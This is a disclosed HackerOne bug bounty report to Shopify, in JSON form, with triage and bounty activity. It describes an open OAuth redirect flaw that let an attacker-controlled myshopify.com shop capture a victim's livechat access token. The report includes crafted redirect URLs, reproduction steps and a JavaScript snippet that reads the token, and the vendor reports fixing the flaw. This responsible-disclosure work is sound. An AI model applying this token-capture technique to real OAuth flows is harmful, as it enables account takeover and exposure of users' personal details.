{"id":151058,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTEwNTg=","url":"https://hackerone.com/reports/151058","title":"Stealing livechat token and using it to chat as the user - user information disclosure ","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-07-13T06:15:51.924Z","submitted_at":"2016-07-13T06:15:51.924Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"zombiehelp54","url":"/zombiehelp54","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-07-19T00:53:07.236Z","bug_reporter_agreed_on_going_public_at":"2016-07-19T00:53:07.044Z","team_member_agreed_on_going_public_at":"2016-07-18T23:30:47.186Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi , I have found an issue through which an attacker can steal users' livechat access token and use it to login and chat with the support agents as them , he also will be able to get access to sensitive user information such as his email and his first name and last name.\n#Details: \nWhen you go to https://support.shopify.com/ , if you click the **Open Chat** button at the bottom of the page, you'll be asked to authenticate using your shop. \nWhen you click the **authenticate** button , you'll go to this link: \n```\nhttps://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93\u0026auth_type=chat\u0026return_to=https%3A%2F%2Flivechat.shopify.com%2Fcustomer%2Fchats%2Fnew\u0026shop=\u003cshop\u003e.myshopify.com\n```\nThe problem is that you have configured your oauth redirect_uri (the `return_to` parameter ) to accept any link like this: \n- \u003canything\u003e.shopify.com/\n- \u003canything\u003e.myshopify.com/\n\nWhich means that an attacker can set the redirect URI to something like: \n```\nhttps://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93\u0026auth_type=chat\u0026return_to=https://\u003cattacker_shop\u003e.myshopify.com/\u0026shop=\u003cvictim_shop\u003e.myshopify.com\n```\nAnd send the link to the victim and when his victim opens it , he will be redirected to `https://\u003cattacker_shop\u003e.myshopify.com/?auth_code=\u003caccess_token\u003e` and since the attacker has full control over the HTML and JavaScript of `\u003cattacker_shop\u003e.myshopify.com` , he can use JavaScript to fetch the returned access token and save it anywhere. \n\nThen the attacker can use that access token to login as the user's shop in livechat.shopify.com by going to \n`https://livechat.shopify.com/customer/chats/new?auth_code=\u003caccess_token\u003e\u0026auth_type=chat` \nAfter that the attacker can know the first name and the email of the victim by checking the page source code.\nThey will be stored as: \n```javascript\nvar chat = new TC.CustomerChat({\n      chat: {\"id\":\"\u003cid\u003e\",\"token\":\"\u003cchat_token\u003e\",\"name\":\"\u003cuser_first_and_last_name\u003e\",\"email\":\"\u003cuser_email\u003e\",\"metadata\": \"\u003cother_meta_data\u003e\"},\n      host: \"livechat.shopify.com\",\n      role: \"customer\",\n      eventChannel: eventChannel,\n      pusher: new Pusher(\"c7e0a5a73ab848bea519\")\n    });\n```\n#Steps to reproduce:\n1. Go to: ` https://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93\u0026auth_type=chat\u0026return_to=https://zh5401.myshopify.com/\u0026shop=\u003cyour_shop\u003e.myshopify.com `\n2. If you haven't authorized Shopify support before , you'll be asked to grant access and if you have already done that before , you'll be automatically redirected to `https://zh5401.myshopify.com/?auth_code=\u003caccess_token\u003e\u0026auth_type=chat` \n3. You'll see your access token in an alert box and it will be written to the DOM , copy that access token and open a new browser then go to  `https://livechat.shopify.com/customer/chats/new?auth_code=\u003caccess_token\u003e\u0026auth_type=chat`  \n4. You'll be able to login to livechat , to see your email and name , view the page source then look for `TC.CustomerChat` \n\nCode used in `https://zh5401.myshopify.com` to fetch the `auth_code`: \n```html\n\u003cscript\u003e\n var token = window.location.search.match(/auth_code=([^\u0026]+)/);\n      if (token \u0026\u0026 token.length \u003e 1) {\n        alert(\"Your access token is: \" + token[1]);\n        document.write(\"Attacker can use it to chat with support agents as you and he will be able to get your email \u003cbr\u003e \u003cb\u003eGo to https://livechat.shopify.com/customer/chats/new?auth_type=chat\u0026auth_code=\" + token[1]);\n      }\n\n\u003c/script\u003e\n```\n\n#Impact:\nThere are two impacts here , one is chatting with support agents as another user which may lead to a lot of problems. The other is getting sensitive information about the user such as his email and full name. \n\nThanks! \n","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":67,"voters":["drsniper","hunter","michiel","bogdantcaciuc","yaworsk","lucky_sen","metawolf","vijay_kumar","dilawer01","mdv","and 57 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1066351,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\r\n\r\nOur team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don't worry, we'll get to yours!\r\n\r\nWhile you are waiting, you can read over our list of non applicable issues listed on our program page: https://hackerone.com/shopify. Make sure your issue isn't listed!","automated_response":true,"created_at":"2016-07-13T06:15:52.284Z","updated_at":"2016-07-13T06:15:52.284Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1066874,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. Our engineering team is investigating the issue.","automated_response":false,"created_at":"2016-07-13T13:39:27.671Z","updated_at":"2016-07-13T13:39:27.671Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1067456,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. Validation for the `return_to` parameter was indeed much too lax, and so we have replaced it with a white list containing only the URLs that are actually used by our other applications.\n\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.","automated_response":false,"created_at":"2016-07-13T18:33:00.291Z","updated_at":"2016-07-13T18:33:00.291Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"zombiehelp54","url":"/zombiehelp54"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1075059,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify! This issue has been resolved.","automated_response":false,"created_at":"2016-07-18T23:30:38.493Z","updated_at":"2016-07-18T23:30:38.493Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"1500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"zombiehelp54","url":"/zombiehelp54"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1075060,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-07-18T23:30:47.216Z","updated_at":"2016-07-18T23:30:47.216Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1075111,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-07-19T00:53:07.150Z","updated_at":"2016-07-19T00:53:07.150Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1075112,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-07-19T00:53:07.271Z","updated_at":"2016-07-19T00:53:07.271Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1164699,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2016-08-31T13:19:25.344Z","updated_at":"2018-02-28T13:10:45.980Z","additional_data":{"added_weaknesses":[],"removed_weaknesses":[{"id":18,"name":"Information Disclosure"}]},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}